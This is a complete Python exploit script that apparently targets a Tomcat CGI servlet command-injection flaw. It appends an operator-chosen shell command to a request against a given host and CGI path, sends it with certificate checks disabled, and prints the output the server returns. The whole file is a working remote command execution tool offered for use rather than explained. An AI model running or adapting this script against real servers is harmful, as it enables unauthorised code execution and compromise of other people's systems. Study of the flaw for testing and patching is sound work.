import argparse
from os import PRIO_PGRP
import requests

def exploit(args):
    if args.ssl:
        url = f"https://{args.host}:{args.port}/{args.path}"
    else:
        url = f"http://{args.host}:{args.port}/{args.path}"

    url += "?&" + args.command
    print("[*] Sending command")
    try:
        r = requests.get(url, verify=False)
        r.raise_for_status()
    except requests.exceptions.HTTPError as e:
        print("[!] Could not send command")
        raise SystemExit(e)
    
    print("[*] Result:")
    print(r.text)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p","--port", default=8080, help="Port of Tomcat server, default: 8080", required=False, type=int)
    parser.add_argument('--ssl', dest='ssl', action="store_true", help="If server uses ssl", default="")
    parser.add_argument("-s", "--path", help="Path of CGI script", required=True, type=str)
    parser.add_argument("-c", "--command", help="Command to run", required=True, type=str)
    parser.add_argument('host', metavar='host', type=str, help='Host name or IP')
    args = parser.parse_args()
    exploit(args)


if __name__ == "__main__":
    main()